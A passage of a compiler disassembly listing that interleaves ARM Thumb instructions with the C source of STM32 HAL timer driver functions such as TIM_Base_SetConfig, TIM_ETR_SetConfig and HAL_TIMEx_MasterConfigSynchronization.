      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005284:	687b      	ldr	r3, [r7, #4]
 8005286:	681b      	ldr	r3, [r3, #0]
 8005288:	2150      	movs	r1, #80	; 0x50
 800528a:	4618      	mov	r0, r3
 800528c:	f000 f927 	bl	80054de <TIM_ITRx_SetConfig>
      break;
 8005290:	e02c      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 8005292:	687b      	ldr	r3, [r7, #4]
 8005294:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005296:	683b      	ldr	r3, [r7, #0]
 8005298:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800529a:	683b      	ldr	r3, [r7, #0]
 800529c:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 800529e:	461a      	mov	r2, r3
 80052a0:	f000 f8ed 	bl	800547e <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80052a4:	687b      	ldr	r3, [r7, #4]
 80052a6:	681b      	ldr	r3, [r3, #0]
 80052a8:	2160      	movs	r1, #96	; 0x60
 80052aa:	4618      	mov	r0, r3
 80052ac:	f000 f917 	bl	80054de <TIM_ITRx_SetConfig>
      break;
 80052b0:	e01c      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80052b2:	687b      	ldr	r3, [r7, #4]
 80052b4:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80052b6:	683b      	ldr	r3, [r7, #0]
 80052b8:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80052ba:	683b      	ldr	r3, [r7, #0]
 80052bc:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80052be:	461a      	mov	r2, r3
 80052c0:	f000 f8ae 	bl	8005420 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 80052c4:	687b      	ldr	r3, [r7, #4]
 80052c6:	681b      	ldr	r3, [r3, #0]
 80052c8:	2140      	movs	r1, #64	; 0x40
 80052ca:	4618      	mov	r0, r3
 80052cc:	f000 f907 	bl	80054de <TIM_ITRx_SetConfig>
      break;
 80052d0:	e00c      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 80052d2:	687b      	ldr	r3, [r7, #4]
 80052d4:	681a      	ldr	r2, [r3, #0]
 80052d6:	683b      	ldr	r3, [r7, #0]
 80052d8:	681b      	ldr	r3, [r3, #0]
 80052da:	4619      	mov	r1, r3
 80052dc:	4610      	mov	r0, r2
 80052de:	f000 f8fe 	bl	80054de <TIM_ITRx_SetConfig>
      break;
 80052e2:	e003      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 80052e4:	2301      	movs	r3, #1
 80052e6:	73fb      	strb	r3, [r7, #15]
      break;
 80052e8:	e000      	b.n	80052ec <HAL_TIM_ConfigClockSource+0x178>
      break;
 80052ea:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 80052ec:	687b      	ldr	r3, [r7, #4]
 80052ee:	2201      	movs	r2, #1
 80052f0:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 80052f4:	687b      	ldr	r3, [r7, #4]
 80052f6:	2200      	movs	r2, #0
 80052f8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 80052fc:	7bfb      	ldrb	r3, [r7, #15]
}
 80052fe:	4618      	mov	r0, r3
 8005300:	3710      	adds	r7, #16
 8005302:	46bd      	mov	sp, r7
 8005304:	bd80      	pop	{r7, pc}

08005306 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 8005306:	b480      	push	{r7}
 8005308:	b083      	sub	sp, #12
 800530a:	af00      	add	r7, sp, #0
 800530c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 800530e:	bf00      	nop
 8005310:	370c      	adds	r7, #12
 8005312:	46bd      	mov	sp, r7
 8005314:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005318:	4770      	bx	lr

0800531a <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 800531a:	b480      	push	{r7}
 800531c:	b083      	sub	sp, #12
 800531e:	af00      	add	r7, sp, #0
 8005320:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 8005322:	bf00      	nop
 8005324:	370c      	adds	r7, #12
 8005326:	46bd      	mov	sp, r7
 8005328:	f85d 7b04 	ldr.w	r7, [sp], #4
 800532c:	4770      	bx	lr

0800532e <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 800532e:	b480      	push	{r7}
 8005330:	b083      	sub	sp, #12
 8005332:	af00      	add	r7, sp, #0
 8005334:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 8005336:	bf00      	nop
 8005338:	370c      	adds	r7, #12
 800533a:	46bd      	mov	sp, r7
 800533c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005340:	4770      	bx	lr

08005342 <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 8005342:	b480      	push	{r7}
 8005344:	b083      	sub	sp, #12
 8005346:	af00      	add	r7, sp, #0
 8005348:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 800534a:	bf00      	nop
 800534c:	370c      	adds	r7, #12
 800534e:	46bd      	mov	sp, r7
 8005350:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005354:	4770      	bx	lr
	...

08005358 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005358:	b480      	push	{r7}
 800535a:	b085      	sub	sp, #20
 800535c:	af00      	add	r7, sp, #0
 800535e:	6078      	str	r0, [r7, #4]
 8005360:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 8005362:	687b      	ldr	r3, [r7, #4]
 8005364:	681b      	ldr	r3, [r3, #0]
 8005366:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005368:	687b      	ldr	r3, [r7, #4]
 800536a:	4a2a      	ldr	r2, [pc, #168]	; (8005414 <TIM_Base_SetConfig+0xbc>)
 800536c:	4293      	cmp	r3, r2
 800536e:	d003      	beq.n	8005378 <TIM_Base_SetConfig+0x20>
 8005370:	687b      	ldr	r3, [r7, #4]
 8005372:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005376:	d108      	bne.n	800538a <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005378:	68fb      	ldr	r3, [r7, #12]
 800537a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800537e:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 8005380:	683b      	ldr	r3, [r7, #0]
 8005382:	685b      	ldr	r3, [r3, #4]
 8005384:	68fa      	ldr	r2, [r7, #12]
 8005386:	4313      	orrs	r3, r2
 8005388:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 800538a:	687b      	ldr	r3, [r7, #4]
 800538c:	4a21      	ldr	r2, [pc, #132]	; (8005414 <TIM_Base_SetConfig+0xbc>)
 800538e:	4293      	cmp	r3, r2
 8005390:	d00b      	beq.n	80053aa <TIM_Base_SetConfig+0x52>
 8005392:	687b      	ldr	r3, [r7, #4]
 8005394:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005398:	d007      	beq.n	80053aa <TIM_Base_SetConfig+0x52>
 800539a:	687b      	ldr	r3, [r7, #4]
 800539c:	4a1e      	ldr	r2, [pc, #120]	; (8005418 <TIM_Base_SetConfig+0xc0>)
 800539e:	4293      	cmp	r3, r2
 80053a0:	d003      	beq.n	80053aa <TIM_Base_SetConfig+0x52>
 80053a2:	687b      	ldr	r3, [r7, #4]
 80053a4:	4a1d      	ldr	r2, [pc, #116]	; (800541c <TIM_Base_SetConfig+0xc4>)
 80053a6:	4293      	cmp	r3, r2
 80053a8:	d108      	bne.n	80053bc <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80053aa:	68fb      	ldr	r3, [r7, #12]
 80053ac:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80053b0:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80053b2:	683b      	ldr	r3, [r7, #0]
 80053b4:	68db      	ldr	r3, [r3, #12]
 80053b6:	68fa      	ldr	r2, [r7, #12]
 80053b8:	4313      	orrs	r3, r2
 80053ba:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 80053bc:	68fb      	ldr	r3, [r7, #12]
 80053be:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80053c2:	683b      	ldr	r3, [r7, #0]
 80053c4:	695b      	ldr	r3, [r3, #20]
 80053c6:	4313      	orrs	r3, r2
 80053c8:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 80053ca:	687b      	ldr	r3, [r7, #4]
 80053cc:	68fa      	ldr	r2, [r7, #12]
 80053ce:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 80053d0:	683b      	ldr	r3, [r7, #0]
 80053d2:	689a      	ldr	r2, [r3, #8]
 80053d4:	687b      	ldr	r3, [r7, #4]
 80053d6:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 80053d8:	683b      	ldr	r3, [r7, #0]
 80053da:	681a      	ldr	r2, [r3, #0]
 80053dc:	687b      	ldr	r3, [r7, #4]
 80053de:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 80053e0:	687b      	ldr	r3, [r7, #4]
 80053e2:	4a0c      	ldr	r2, [pc, #48]	; (8005414 <TIM_Base_SetConfig+0xbc>)
 80053e4:	4293      	cmp	r3, r2
 80053e6:	d007      	beq.n	80053f8 <TIM_Base_SetConfig+0xa0>
 80053e8:	687b      	ldr	r3, [r7, #4]
 80053ea:	4a0b      	ldr	r2, [pc, #44]	; (8005418 <TIM_Base_SetConfig+0xc0>)
 80053ec:	4293      	cmp	r3, r2
 80053ee:	d003      	beq.n	80053f8 <TIM_Base_SetConfig+0xa0>
 80053f0:	687b      	ldr	r3, [r7, #4]
 80053f2:	4a0a      	ldr	r2, [pc, #40]	; (800541c <TIM_Base_SetConfig+0xc4>)
 80053f4:	4293      	cmp	r3, r2
 80053f6:	d103      	bne.n	8005400 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 80053f8:	683b      	ldr	r3, [r7, #0]
 80053fa:	691a      	ldr	r2, [r3, #16]
 80053fc:	687b      	ldr	r3, [r7, #4]
 80053fe:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005400:	687b      	ldr	r3, [r7, #4]
 8005402:	2201      	movs	r2, #1
 8005404:	615a      	str	r2, [r3, #20]
}
 8005406:	bf00      	nop
 8005408:	3714      	adds	r7, #20
 800540a:	46bd      	mov	sp, r7
 800540c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005410:	4770      	bx	lr
 8005412:	bf00      	nop
 8005414:	40012c00 	.word	0x40012c00
 8005418:	40014000 	.word	0x40014000
 800541c:	40014400 	.word	0x40014400

08005420 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005420:	b480      	push	{r7}
 8005422:	b087      	sub	sp, #28
 8005424:	af00      	add	r7, sp, #0
 8005426:	60f8      	str	r0, [r7, #12]
 8005428:	60b9      	str	r1, [r7, #8]
 800542a:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 800542c:	68fb      	ldr	r3, [r7, #12]
 800542e:	6a1b      	ldr	r3, [r3, #32]
 8005430:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 8005432:	68fb      	ldr	r3, [r7, #12]
 8005434:	6a1b      	ldr	r3, [r3, #32]
 8005436:	f023 0201 	bic.w	r2, r3, #1
 800543a:	68fb      	ldr	r3, [r7, #12]
 800543c:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800543e:	68fb      	ldr	r3, [r7, #12]
 8005440:	699b      	ldr	r3, [r3, #24]
 8005442:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005444:	693b      	ldr	r3, [r7, #16]
 8005446:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 800544a:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 800544c:	687b      	ldr	r3, [r7, #4]
 800544e:	011b      	lsls	r3, r3, #4
 8005450:	693a      	ldr	r2, [r7, #16]
 8005452:	4313      	orrs	r3, r2
 8005454:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 8005456:	697b      	ldr	r3, [r7, #20]
 8005458:	f023 030a 	bic.w	r3, r3, #10
 800545c:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 800545e:	697a      	ldr	r2, [r7, #20]
 8005460:	68bb      	ldr	r3, [r7, #8]
 8005462:	4313      	orrs	r3, r2
 8005464:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 8005466:	68fb      	ldr	r3, [r7, #12]
 8005468:	693a      	ldr	r2, [r7, #16]
 800546a:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 800546c:	68fb      	ldr	r3, [r7, #12]
 800546e:	697a      	ldr	r2, [r7, #20]
 8005470:	621a      	str	r2, [r3, #32]
}
 8005472:	bf00      	nop
 8005474:	371c      	adds	r7, #28
 8005476:	46bd      	mov	sp, r7
 8005478:	f85d 7b04 	ldr.w	r7, [sp], #4
 800547c:	4770      	bx	lr

0800547e <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800547e:	b480      	push	{r7}
 8005480:	b087      	sub	sp, #28
 8005482:	af00      	add	r7, sp, #0
 8005484:	60f8      	str	r0, [r7, #12]
 8005486:	60b9      	str	r1, [r7, #8]
 8005488:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 800548a:	68fb      	ldr	r3, [r7, #12]
 800548c:	6a1b      	ldr	r3, [r3, #32]
 800548e:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 8005490:	68fb      	ldr	r3, [r7, #12]
 8005492:	6a1b      	ldr	r3, [r3, #32]
 8005494:	f023 0210 	bic.w	r2, r3, #16
 8005498:	68fb      	ldr	r3, [r7, #12]
 800549a:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800549c:	68fb      	ldr	r3, [r7, #12]
 800549e:	699b      	ldr	r3, [r3, #24]
 80054a0:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80054a2:	693b      	ldr	r3, [r7, #16]
 80054a4:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80054a8:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80054aa:	687b      	ldr	r3, [r7, #4]
 80054ac:	031b      	lsls	r3, r3, #12
 80054ae:	693a      	ldr	r2, [r7, #16]
 80054b0:	4313      	orrs	r3, r2
 80054b2:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80054b4:	697b      	ldr	r3, [r7, #20]
 80054b6:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80054ba:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80054bc:	68bb      	ldr	r3, [r7, #8]
 80054be:	011b      	lsls	r3, r3, #4
 80054c0:	697a      	ldr	r2, [r7, #20]
 80054c2:	4313      	orrs	r3, r2
 80054c4:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 80054c6:	68fb      	ldr	r3, [r7, #12]
 80054c8:	693a      	ldr	r2, [r7, #16]
 80054ca:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80054cc:	68fb      	ldr	r3, [r7, #12]
 80054ce:	697a      	ldr	r2, [r7, #20]
 80054d0:	621a      	str	r2, [r3, #32]
}
 80054d2:	bf00      	nop
 80054d4:	371c      	adds	r7, #28
 80054d6:	46bd      	mov	sp, r7
 80054d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054dc:	4770      	bx	lr

080054de <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 80054de:	b480      	push	{r7}
 80054e0:	b085      	sub	sp, #20
 80054e2:	af00      	add	r7, sp, #0
 80054e4:	6078      	str	r0, [r7, #4]
 80054e6:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 80054e8:	687b      	ldr	r3, [r7, #4]
 80054ea:	689b      	ldr	r3, [r3, #8]
 80054ec:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 80054ee:	68fb      	ldr	r3, [r7, #12]
 80054f0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80054f4:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 80054f6:	683a      	ldr	r2, [r7, #0]
 80054f8:	68fb      	ldr	r3, [r7, #12]
 80054fa:	4313      	orrs	r3, r2
 80054fc:	f043 0307 	orr.w	r3, r3, #7
 8005500:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005502:	687b      	ldr	r3, [r7, #4]
 8005504:	68fa      	ldr	r2, [r7, #12]
 8005506:	609a      	str	r2, [r3, #8]
}
 8005508:	bf00      	nop
 800550a:	3714      	adds	r7, #20
 800550c:	46bd      	mov	sp, r7
 800550e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005512:	4770      	bx	lr

08005514 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005514:	b480      	push	{r7}
 8005516:	b087      	sub	sp, #28
 8005518:	af00      	add	r7, sp, #0
 800551a:	60f8      	str	r0, [r7, #12]
 800551c:	60b9      	str	r1, [r7, #8]
 800551e:	607a      	str	r2, [r7, #4]
 8005520:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 8005522:	68fb      	ldr	r3, [r7, #12]
 8005524:	689b      	ldr	r3, [r3, #8]
 8005526:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005528:	697b      	ldr	r3, [r7, #20]
 800552a:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 800552e:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 8005530:	683b      	ldr	r3, [r7, #0]
 8005532:	021a      	lsls	r2, r3, #8
 8005534:	687b      	ldr	r3, [r7, #4]
 8005536:	431a      	orrs	r2, r3
 8005538:	68bb      	ldr	r3, [r7, #8]
 800553a:	4313      	orrs	r3, r2
 800553c:	697a      	ldr	r2, [r7, #20]
 800553e:	4313      	orrs	r3, r2
 8005540:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005542:	68fb      	ldr	r3, [r7, #12]
 8005544:	697a      	ldr	r2, [r7, #20]
 8005546:	609a      	str	r2, [r3, #8]
}
 8005548:	bf00      	nop
 800554a:	371c      	adds	r7, #28
 800554c:	46bd      	mov	sp, r7
 800554e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005552:	4770      	bx	lr

08005554 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005554:	b480      	push	{r7}
 8005556:	b085      	sub	sp, #20
 8005558:	af00      	add	r7, sp, #0
 800555a:	6078      	str	r0, [r7, #4]
 800555c:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 800555e:	687b      	ldr	r3, [r7, #4]
 8005560:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005564:	2b01      	cmp	r3, #1
 8005566:	d101      	bne.n	800556c <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005568:	2302      	movs	r3, #2
 800556a:	e04f      	b.n	800560c <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 800556c:	687b      	ldr	r3, [r7, #4]
 800556e:	2201      	movs	r2, #1
 8005570:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005574:	687b      	ldr	r3, [r7, #4]
 8005576:	2202      	movs	r2, #2
 8005578:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 800557c:	687b      	ldr	r3, [r7, #4]
 800557e:	681b      	ldr	r3, [r3, #0]
 8005580:	685b      	ldr	r3, [r3, #4]
 8005582:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005584:	687b      	ldr	r3, [r7, #4]
 8005586:	681b      	ldr	r3, [r3, #0]
 8005588:	689b      	ldr	r3, [r3, #8]
 800558a:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 800558c:	687b      	ldr	r3, [r7, #4]
 800558e:	681b      	ldr	r3, [r3, #0]
 8005590:	4a21      	ldr	r2, [pc, #132]	; (8005618 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005592:	4293      	cmp	r3, r2
 8005594:	d108      	bne.n	80055a8 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 8005596:	68fb      	ldr	r3, [r7, #12]
 8005598:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 800559c:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 800559e:	683b      	ldr	r3, [r7, #0]
 80055a0:	685b      	ldr	r3, [r3, #4]
 80055a2:	68fa      	ldr	r2, [r7, #12]
 80055a4:	4313      	orrs	r3, r2
 80055a6:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80055a8:	68fb      	ldr	r3, [r7, #12]
 80055aa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80055ae:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80055b0:	683b      	ldr	r3, [r7, #0]
 80055b2:	681b      	ldr	r3, [r3, #0]
 80055b4:	68fa      	ldr	r2, [r7, #12]
 80055b6:	4313      	orrs	r3, r2
 80055b8:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80055ba:	687b      	ldr	r3, [r7, #4]
 80055bc:	681b      	ldr	r3, [r3, #0]
 80055be:	68fa      	ldr	r2, [r7, #12]
 80055c0:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80055c2:	687b      	ldr	r3, [r7, #4]
 80055c4:	681b      	ldr	r3, [r3, #0]
 80055c6:	4a14      	ldr	r2, [pc, #80]	; (8005618 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80055c8:	4293      	cmp	r3, r2
 80055ca:	d009      	beq.n	80055e0 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80055cc:	687b      	ldr	r3, [r7, #4]
 80055ce:	681b      	ldr	r3, [r3, #0]
 80055d0:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80055d4:	d004      	beq.n	80055e0 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80055d6:	687b      	ldr	r3, [r7, #4]
 80055d8:	681b      	ldr	r3, [r3, #0]
 80055da:	4a10      	ldr	r2, [pc, #64]	; (800561c <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 80055dc:	4293      	cmp	r3, r2
 80055de:	d10c      	bne.n	80055fa <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 80055e0:	68bb      	ldr	r3, [r7, #8]
 80055e2:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 80055e6:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 80055e8:	683b      	ldr	r3, [r7, #0]
 80055ea:	689b      	ldr	r3, [r3, #8]
